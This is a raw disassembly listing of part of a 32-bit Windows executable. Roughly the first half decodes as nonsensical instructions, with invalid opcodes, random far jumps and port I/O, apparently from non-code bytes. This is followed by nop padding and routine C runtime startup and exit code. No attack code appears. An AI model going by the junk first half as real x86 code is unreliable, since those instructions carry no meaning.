  4224ae:	push   ecx
  4224af:	inc    ecx
  4224b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224b2:	pop    eax
  4224b3:	and    dh,bh
  4224b5:	mov    ah,0x14
  4224b7:	mov    ebx,0x11e7344b
  4224bc:	fsubrp st(0),st
  4224be:	xchg   edi,eax
  4224bf:	sub    edx,esi
  4224c1:	aaa    
  4224c2:	inc    edi
  4224c3:	(bad)  
  4224c4:	lods   al,BYTE PTR ds:[esi]
  4224c5:	push   es
  4224c6:	jnp    0x4224f7
  4224c8:	xchg   esi,eax
  4224c9:	and    edx,DWORD PTR [esi]
  4224cb:	imul   esp,DWORD PTR [ebp+0x1c],0x5
  4224cf:	in     al,dx
  4224d0:	adc    DWORD PTR [ecx],0xf73c740
  4224d6:	aam    0x57
  4224d8:	lahf   
  4224d9:	rcr    dh,1
  4224db:	or     al,0x4a
  4224dd:	dec    esi
  4224de:	outs   dx,BYTE PTR ds:[esi]
  4224df:	xor    ecx,DWORD PTR [edx]
  4224e1:	pop    ss
  4224e2:	dec    ebx
  4224e3:	jl     0x4224f4
  4224e5:	out    dx,al
  4224e6:	jbe    0x42250e
  4224e8:	ds push 0xffffffd4
  4224eb:	fild   QWORD PTR [ebx]
  4224ed:	sbb    DWORD PTR [edx-0x79],0xffffffd1
  4224f1:	jl     0x4224cf
  4224f3:	imul   dh
  4224f5:	imul   esi,DWORD PTR [esi],0x54
  4224f8:	sbb    ebp,esp
  4224fa:	scas   al,BYTE PTR es:[edi]
  4224fb:	into   
  4224fc:	mov    ebx,0x17f0ac33
  422501:	jmp    0x68e2:0xec7a0859
  422508:	mov    eax,ds:0x30a2cfbb
  42250d:	stos   DWORD PTR es:[edi],eax
  42250e:	and    dh,ch
  422510:	mov    esp,0xec4eab68
  422515:	cmp    BYTE PTR [eax+0x56],cl
  422518:	jmp    0xb9bc:0xe5db28c0
  42251f:	xor    DWORD PTR [ebx],ebx
  422521:	aas    
  422522:	(bad)  
  422523:	inc    edi
  422524:	or     ch,BYTE PTR [ecx]
  422526:	or     eax,0x408918f1
  42252b:	push   ss
  42252c:	fcomp  DWORD PTR [edx*2-0x1ed663cc]
  422533:	add    BYTE PTR [esi-0x12112114],0x49
  42253a:	scas   eax,DWORD PTR es:[edi]
  42253b:	shl    DWORD PTR [edx-0x7ae03a43],cl
  422541:	mov    edx,0x3750ed54
  422546:	dec    esi
  422547:	pop    ebp
  422548:	push   0x262f462f
  42254d:	mov    bh,0x5c
  42254f:	mov    ch,0x1c
  422551:	mov    edx,0x7c860fda
  422556:	in     eax,0xa1
  422558:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422559:	xor    eax,0x75aa07a8
  42255e:	push   es
  42255f:	mov    esp,0x72bd6bf3
  422564:	aam    0xfe
  422566:	mov    dh,0x5d
  422568:	cld    
  422569:	inc    ebp
  42256a:	mov    dl,0xd6
  42256c:	pop    ss
  42256d:	jbe    0x1c9a39bd
  422573:	xchg   edx,eax
  422574:	shr    DWORD PTR [ecx+0x3a2127b4],0xe7
  42257b:	and    ah,dh
  42257d:	pushf  
  42257e:	lds    edx,FWORD PTR [ebx+0x6b]
  422581:	sub    ah,BYTE PTR [ecx]
  422583:	ret    
  422584:	add    DWORD PTR [edi+0x10],eax
  422587:	or     al,0xe2
  422589:	mov    ss,WORD PTR [esi+0x3b]
  42258c:	sub    ah,BYTE PTR [edx]
  42258e:	sub    al,0xb0
  422590:	push   0xaeb504a
  422595:	or     ecx,DWORD PTR [eax+0x28]
  422598:	cli    
  422599:	sub    al,0x7d
  42259b:	enter  0x596e,0x68
  42259f:	das    
  4225a0:	test   DWORD PTR [edi+0x3b],esp
  4225a3:	xor    dh,BYTE PTR [ebp-0x5f5949b5]
  4225a9:	es dec esp
  4225ab:	outs   dx,DWORD PTR ds:[esi]
  4225ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225ad:	ss cmp eax,0xcafb8217
  4225b3:	pushf  
  4225b4:	ret    
  4225b5:	ds dec ecx
  4225b7:	mov    cl,bl
  4225b9:	push   ebp
  4225ba:	sbb    edi,DWORD PTR [eax-0x59]
  4225bd:	xchg   edi,eax
  4225be:	xchg   ebx,eax
  4225bf:	pop    ebx
  4225c0:	push   0xc47befeb
  4225c5:	cmp    esp,DWORD PTR [ecx]
  4225c7:	jno    0x422564
  4225c9:	push   ebp
  4225ca:	mov    ds:0x4616409b,eax
  4225cf:	ror    BYTE PTR [ebx],0xdb
  4225d2:	cld    
  4225d3:	fistp  WORD PTR [esi+0x59ddf7c2]
  4225d9:	mov    ch,0x3c
  4225db:	push   esi
  4225dc:	test   al,0x1f
  4225de:	stos   DWORD PTR es:[edi],eax
  4225df:	mov    edi,ss
  4225e1:	jns    0x42261c
  4225e3:	push   ebp
  4225e4:	add    DWORD PTR [esi-0x6cab1c8b],0x60d6b384
  4225ee:	pop    es
  4225ef:	jge    0x4225ca
  4225f1:	mov    dh,0x1a
  4225f3:	inc    esp
  4225f4:	dec    edx
  4225f5:	or     al,0x6c
  4225f7:	mov    ebx,0xde3da01c
  4225fc:	ins    BYTE PTR es:[edi],dx
  4225fd:	fisttp WORD PTR [edx-0x6210beef]
  422603:	loope  0x4225e3
  422605:	call   0x5a28:0xc69ae31f
  42260c:	sbb    DWORD PTR [edi+0xe45d67c],ebx
  422612:	xchg   esi,eax
  422613:	mov    ds:0x105f925b,al
  422618:	fmul   QWORD PTR [edx]
  42261a:	leave  
  42261b:	jb     0x422631
  42261d:	mov    al,ds:0xfdd3b275
  422622:	mov    ecx,0x502aa8ac
  422627:	lods   al,BYTE PTR ds:[esi]
  422628:	add    al,0x2a
  42262a:	pop    esi
  42262b:	push   esp
  42262c:	scas   eax,DWORD PTR es:[edi]
  42262d:	stc    
  42262e:	pop    ecx
  42262f:	ja     0x4225c3
  422631:	imul   esp,DWORD PTR [ebx+0x5a154236],0xffffff87
  422638:	cmp    al,BYTE PTR [edi]
  42263a:	xor    BYTE PTR es:[esp+edx*4-0x72ff0a85],bh
  422642:	(bad)  
  422643:	in     eax,0x55
  422645:	push   ss
  422646:	mov    bh,0xe9
  422648:	hlt    
  422649:	xchg   ebx,eax
  42264a:	test   BYTE PTR [esi-0x2d05cad7],0x32
  422651:	or     ebx,ebx
  422653:	imul   esi,DWORD PTR [ebp+0x497ec748],0x1f
  42265a:	(bad)  [esi-0x64]
  42265d:	fcmovnbe st,st(4)
  42265f:	fistp  WORD PTR ds:0x5a297bff
  422665:	clc    
  422666:	inc    ecx
  422667:	scas   eax,DWORD PTR es:[edi]
  422668:	jle    0x422659
  42266a:	push   esp
  42266b:	dec    esi
  42266c:	pop    ebx
  42266d:	mov    bh,0x48
  42266f:	scas   eax,DWORD PTR es:[edi]
  422670:	rol    al,cl
  422672:	out    dx,eax
  422673:	mov    ebp,DWORD PTR [edx-0x30bf1737]
  422679:	pop    ebx
  42267a:	loop   0x4225fd
  42267c:	ja     0x422679
  42267e:	sub    eax,0x6fffb414
  422683:	(bad)  
  422684:	sar    dl,1
  422686:	rol    cl,0x47
  422689:	int    0x73
  42268b:	pop    esi
  42268c:	rol    BYTE PTR [ebp+ebp*2+0x11f5477c],cl
  422693:	arpl   cx,si
  422695:	int3   
  422696:	mov    bh,0xb3
  422698:	pop    ebx
  422699:	frstor [ebx-0x26]
  42269c:	push   ebp
  42269d:	sbb    BYTE PTR [edx+ecx*1+0xca44d9],0x4b
  4226a5:	xor    BYTE PTR [eax],ch
  4226a7:	adc    eax,0x1c1c7037
  4226ac:	push   esp
  4226ad:	adc    eax,0x5a6ee1a7
  4226b2:	sub    al,0xa1
  4226b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226b5:	lods   al,BYTE PTR ds:[esi]
  4226b6:	mov    bl,0x73
  4226b8:	pop    ss
  4226b9:	pop    esp
  4226ba:	dec    ebx
  4226bb:	adc    ch,BYTE PTR [ebx]
  4226bd:	jmp    0x6b84d791
  4226c2:	loope  0x422737
  4226c4:	mov    ecx,DWORD PTR [edx+0x15afd438]
  4226ca:	mov    bh,0xa8
  4226cc:	mov    BYTE PTR [ebp+0x359e3df3],dl
  4226d2:	enter  0xe520,0x3
  4226d6:	dec    edi
  4226d7:	adc    al,0xec
  4226d9:	retf   
  4226da:	arpl   WORD PTR [ecx],sp
  4226dc:	lahf   
  4226dd:	or     BYTE PTR [eax+0x7e],0xba
  4226e1:	(bad)  
  4226e2:	loope  0x42269a
  4226e4:	xor    DWORD PTR [edx+0x59b5efac],ebp
  4226ea:	scas   eax,DWORD PTR es:[edi]
  4226eb:	push   edx
  4226ec:	fwait
  4226ed:	pop    ebp
  4226ee:	(bad)  
  4226f0:	mov    WORD PTR [eax-0x442f032f],cs
  4226f6:	jl     0x422697
  4226f8:	dec    ebx
  4226f9:	call   0x2605ba8e
  4226fe:	and    eax,0xc583cfa6
  422703:	ficom  DWORD PTR [edx+0x14]
  422706:	cwde   
  422707:	cmc    
  422708:	jns    0x42272f
  42270a:	out    dx,eax
  42270b:	and    al,0xc3
  42270d:	stc    
  42270e:	adc    ecx,DWORD PTR [eax+eax*8-0x18047f37]
  422715:	pop    es
  422716:	ret    
  422717:	inc    edi
  422718:	fs jae 0x4226ff
  42271b:	into   
  42271c:	push   0x993da81b
  422721:	lods   eax,DWORD PTR ds:[esi]
  422722:	enter  0x4f91,0xb7
  422726:	add    bl,BYTE PTR [esi]
  422728:	mov    ch,0xd0
  42272a:	dec    ebx
  42272b:	out    0x96,al
  42272d:	xchg   esp,eax
  42272e:	sbb    BYTE PTR ds:0xe35d85de,bh
  422734:	scas   eax,DWORD PTR es:[edi]
  422735:	xchg   DWORD PTR [ebx],ecx
  422737:	xchg   BYTE PTR [ebx+0x34],dl
  42273a:	ds xchg ebx,eax
  42273c:	sbb    DWORD PTR es:[edi-0x676ea2b8],0xffffff8c
  422744:	mov    ds:0xedab3366,al
  422749:	cwde   
  42274a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42274b:	in     eax,dx
  42274c:	xor    dl,BYTE PTR [ebp+0x2eea4240]
  422752:	es inc eax
  422754:	sub    eax,0x2154e498
  422759:	test   al,0xf1
  42275b:	xchg   edi,eax
  42275c:	push   esp
  42275d:	rcl    BYTE PTR [ebx+0x55],1
  422760:	push   edx
  422761:	adc    esi,DWORD PTR [ecx-0x6a]
  422764:	pop    esi
  422765:	es push esi
  422767:	jb     0x422784
  422769:	iret   
  42276a:	push   cs
  42276b:	out    0xe4,eax
  42276d:	mov    ebp,0xbb79aa6e
  422772:	aad    0x58
  422774:	out    0x1f,al
  422776:	retf   
  422777:	inc    edi
  422778:	jae    0x42276d
  42277a:	xor    DWORD PTR [edi-0x7322baab],esi
  422780:	nop
  422781:	paddw  mm1,QWORD PTR [edi+0x46]
  422785:	cmp    eax,0x70d59851
  42278a:	mov    al,BYTE PTR [edi+ecx*8]
  42278d:	jbe    0x422756
  42278f:	dec    ebp
  422790:	int    0x51
  422792:	into   
  422793:	push   ss
  422794:	sar    DWORD PTR [ecx+0x3a6f2cbc],1
  42279a:	enter  0x53e9,0x12
  42279e:	das    
  42279f:	push   ebx
  4227a0:	sub    BYTE PTR [ecx+0x33],bl
  4227a3:	out    0xc2,eax
  4227a5:	or     bh,0x9
  4227a8:	adc    al,0x40
  4227aa:	sub    eax,DWORD PTR [ebx+esi*8+0x23329016]
  4227b1:	xchg   ecx,eax
  4227b2:	pop    es
  4227b3:	sbb    ch,dl
  4227b5:	(bad)  
  4227b6:	lds    edi,FWORD PTR [ebx]
  4227b8:	pop    edi
  4227b9:	mov    bl,0xa8
  4227bb:	rol    BYTE PTR [ebx+0x2a84265c],1
  4227c1:	inc    edi
  4227c2:	xchg   ecx,eax
  4227c3:	pop    DWORD PTR [edx-0x36]
  4227c6:	add    eax,0x47e99da8
  4227cb:	sub    ecx,DWORD PTR [eax-0x46]
  4227ce:	stos   BYTE PTR es:[edi],al
  4227cf:	lea    ecx,[edi+0x12f90c29]
  4227d5:	mov    dh,0xf3
  4227d7:	loope  0x42283f
  4227d9:	add    ah,bl
  4227db:	shl    BYTE PTR [esp+eiz*2+0x7e9f844],0x8f
  4227e3:	or     dh,BYTE PTR [ebp-0xdf93b14]
  4227e9:	in     eax,dx
  4227ea:	sbb    dl,BYTE PTR [ebx-0x68c3934a]
  4227f0:	ret    
  4227f1:	clc    
  4227f2:	mov    al,0xd2
  4227f4:	arpl   WORD PTR [edx-0x7085b299],ax
  4227fa:	or     al,0x37
  4227fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227fd:	(bad)  
  4227fe:	hlt    
  4227ff:	sbb    BYTE PTR [ebp+0x1],0x7f
  422803:	stos   DWORD PTR es:[edi],eax
  422804:	mov    eax,0xac23eabd
  422809:	hlt    
  42280a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42280b:	xchg   ecx,eax
  42280c:	sub    DWORD PTR [eax+0x6e6dcc46],edi
  422812:	lock add edx,edx
  422815:	adc    cl,bh
  422817:	jp     0x4227fd
  422819:	arpl   WORD PTR [edx+0x44fcc60d],bp
  42281f:	inc    ebx
  422820:	(bad)  
  422822:	sbb    BYTE PTR [edx],bl
  422824:	sub    DWORD PTR [edx+0x5bdbf82a],ebx
  42282a:	pop    esi
  42282b:	std    
  42282c:	dec    edi
  42282d:	stos   BYTE PTR es:[edi],al
  42282e:	sti    
  42282f:	loopne 0x422871
  422831:	dec    eax
  422832:	pop    eax
  422833:	xchg   ecx,eax
  422834:	mov    edi,0xeeaab638
  422839:	jecxz  0x4227c9
  42283b:	mov    ah,BYTE PTR [edi+edi*4-0x23]
  42283f:	pop    ds
  422840:	inc    esi
  422841:	lods   eax,DWORD PTR es:[esi]
  422843:	pop    ds
  422844:	in     eax,dx
  422845:	les    esi,FWORD PTR [ebp-0x39df8171]
  42284b:	ss in  eax,dx
  42284d:	jnp    0x422886
  42284f:	fstp   DWORD PTR [edi+0x27]
  422852:	add    bl,BYTE PTR [ecx+0x4aa8541f]
  422858:	out    0x4,al
  42285a:	test   eax,0xd50e3b40
  42285f:	shl    DWORD PTR [edx+0x7ba17b14],1
  422865:	outs   dx,BYTE PTR ds:[esi]
  422866:	in     al,dx
  422867:	sub    al,0x94
  422869:	lea    eax,ds:0x1ab911ea
  42286f:	push   ecx
  422870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422871:	mov    eax,0xf0bb2a22
  422876:	stos   BYTE PTR es:[edi],al
  422877:	lods   eax,DWORD PTR ds:[esi]
  422878:	nop
  422879:	jp     0x42288d
  42287b:	pushf  
  42287c:	outs   dx,BYTE PTR ds:[esi]
  42287d:	ficom  WORD PTR [ecx+0xc4904aa]
  422883:	or     bh,ch
  422885:	lock cmc 
  422887:	loop   0x422908
  422889:	dec    esp
  42288a:	jge    0x4228fe
  42288c:	sbb    eax,0x9a5fe8d6
  422891:	shrd   DWORD PTR [esi-0x500533ef],edx,0xd5
  422899:	xchg   ecx,eax
  42289a:	xor    cl,bl
  42289c:	mov    ch,0xdc
  42289e:	fscale 
  4228a0:	cld    
  4228a1:	(bad)  
  4228a2:	pop    ebx
  4228a3:	addr16 pop edi
  4228a5:	in     eax,dx
  4228a6:	jne    0x4228af
  4228a8:	outs   dx,BYTE PTR ds:[esi]
  4228a9:	or     DWORD PTR es:[ebx],esp
  4228ac:	ret    0x73d4
  4228af:	and    eax,0x4489500b
  4228b4:	frstor [ebx-0x5a]
  4228b7:	adc    DWORD PTR ds:0x15dee596,esi
  4228bd:	inc    esp
  4228be:	js     0x4228fd
  4228c0:	adc    bh,BYTE PTR [edi]
  4228c2:	shl    DWORD PTR [esi+0x2c3e3232],1
  4228c8:	xor    BYTE PTR [esi],ch
  4228ca:	pop    ecx
  4228cb:	fnstenv [ecx+0x493ba093]
  4228d1:	into   
  4228d2:	stos   DWORD PTR es:[edi],eax
  4228d3:	stos   BYTE PTR es:[edi],al
  4228d4:	and    ecx,esi
  4228d6:	and    eax,0x16750734
  4228db:	je     0x422936
  4228dd:	sub    esi,DWORD PTR [ecx-0x30f5d3cf]
  4228e3:	ret    0xc74b
  4228e6:	xor    eax,0xf986b8d8
  4228eb:	mov    edx,0xaddfa28d
  4228f0:	fild   WORD PTR [edx+0x28]
  4228f3:	pushf  
  4228f4:	shl    BYTE PTR [edi+edx*4],1
  4228f7:	xchg   ebp,eax
  4228f8:	test   eax,0xe05bb8d2
  4228fd:	inc    esp
  4228fe:	loopne 0x42290e
  422900:	mov    cl,BYTE PTR [edi+eiz*2]
  422903:	les    edx,FWORD PTR fs:[edi+eiz*2+0x17c10c32]
  42290b:	pusha  
  42290c:	retf   0xf8e5
  42290f:	xchg   edi,eax
  422910:	mov    bl,0x1d
  422912:	or     esi,DWORD PTR [edi-0x6846b65f]
  422918:	out    dx,al
  422919:	dec    edi
  42291a:	hlt    
  42291b:	mov    ebx,0xd617a1f
  422920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422921:	loop   0x42294b
  422923:	out    dx,al
  422924:	add    BYTE PTR [edx-0x184dfcf],dl
  42292a:	adc    DWORD PTR [edi-0x63],ebp
  42292d:	mov    ah,0x3a
  42292f:	jle    0x4228f1
  422931:	in     eax,0xd1
  422933:	xchg   ebp,eax
  422934:	jnp    0x42299e
  422936:	gs sbb al,0x62
  422939:	mov    esi,0x9d6a1f95
  42293e:	(bad)  
  422940:	mov    esi,0x1cfdb862
  422945:	stc    
  422946:	jmp    0xdb4fb43c
  42294b:	jl     0x42290a
  42294d:	jp     0x422982
  42294f:	mov    ds:0x567ddfab,eax
  422954:	es (bad) 
  422956:	ins    DWORD PTR es:[edi],dx
  422957:	push   eax
  422958:	in     eax,dx
  422959:	xor    ax,ax
  42295c:	add    esp,0x10
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
